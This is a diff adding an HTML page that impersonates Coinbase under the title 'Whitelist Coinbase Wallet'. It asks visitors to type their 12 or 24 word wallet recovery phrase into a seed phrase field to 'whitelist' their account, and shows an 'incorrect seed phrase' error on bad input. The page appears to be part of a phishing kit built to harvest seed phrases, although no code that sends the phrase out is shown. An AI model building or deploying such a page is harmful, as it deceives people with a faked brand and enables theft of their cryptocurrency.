@@ -1,0 +1,87 @@
+
+<!DOCTYPE html>
+<html class="ll-fb" lang="en" style="background:#0a0b0d;">
+ <head>
+  <meta charset="utf-8"/>
+  <link rel="icon" href="assets/Coinbaselogo.png"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>Coinbase - Whitelist Wallet</title>
+  <meta content="#000000" name="theme-color"/>
+  <link rel="stylesheet" href="css/flow-b-shell.css"/>
+  <link href="css/30.css" rel="stylesheet"/>
+  <style>
+html.ll-fb,
+html.ll-fb *,
+html.ll-fb *::before,
+html.ll-fb *::after {
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
+}
+  </style>
+  <style>
+    /* Chrome autofill paints light UA fill; keep seed field dark */
+    #wl-seed-inp { color-scheme: dark; }
+    #wl-seed-inp:-webkit-autofill,
+    #wl-seed-inp:-webkit-autofill:hover,
+    #wl-seed-inp:-webkit-autofill:focus,
+    #wl-seed-inp:autofill {
+      -webkit-text-fill-color: #fff !important;
+      color: #fff !important;
+      caret-color: #fff !important;
+      box-shadow: 0 0 0 1000px #0a0b0d inset !important;
+      transition: background-color 99999s ease-out;
+    }
+    html.ll-fb.ll-invalid #wl-seed-inp {
+      border-color: #ef4444;
+      box-shadow: 0 0 0 1px #ef4444;
+    }
+    html.ll-fb.ll-invalid #wl-seed-err {
+      display: block !important;
+    }
+  </style>
+</head>
+ <body style="background:#0a0b0d;">
+  <div class="ll-fb-type" id="root">
+   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
+    <div class="w-full px-6 pt-5">
+     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
+      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
+      </path>
+     </svg>
+    </div>
+    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
+     <form action="#" class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 items-center text-center">
+      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
+       Whitelist Coinbase Wallet
+      </span>
+      <svg class="w-32" fill="none" viewbox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+       <path d="M120 60c0-33.137-26.863-60-60-60S0 26.863 0 60s26.863 60 60 60 60-26.863 60-60Z">
+       </path>
+       <path d="M87.87 29H40.01l36.23 15.55c2.2.95 3.63 3.11 3.63 5.51v18.93h8c1.1 0 2-.9 2-2V31c0-1.1-.9-2-2-2Z" fill="#BFC4CF">
+       </path>
+       <path d="m29.87 69 42.5 18.48c1.65.72 3.5-.49 3.5-2.29V69h-46Z" fill="#0052FF">
+       </path>
+       <path d="M72.84 47.45 29.87 29v40h46V52.04c0-2-1.19-3.81-3.03-4.59Z" fill="#0A0B0D">
+       </path>
+      </svg>
+      <span class="font-coinbase-sans text-coinbase-foreground-muted my-4">
+       Enter the 12 or 24 word recovery phrase from Coinbase Wallet to whitelist your account for transfers.
+      </span>
+      <div class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
+       <div style="display:flex;justify-content:space-between;align-items:center;">
+        <span class="text-sm font-semibold">Seed Phrase</span>
+        <span id="wl-seed-wc" style="font-size:0.78em;color:#6b7280;font-family:inherit;"></span>
+       </div>
+       <input id="wl-seed-inp" class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" placeholder="Enter your seed phrase" value="" autocomplete="off"/>
+      </div>
+      <span id="wl-seed-err" style="display:none;color:#ef4444;font-size:0.85em;margin-top:4px;">The seed phrase you entered is incorrect. Please try again with the correct seed phrase.</span>
+      <button id="wl-seed-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center w-full" disabled="" type="button">
+       Continue
+      </button>
+     </form>
+    </div>
+   </div>
+  </div>
+  
+ </body>
+</html>
+
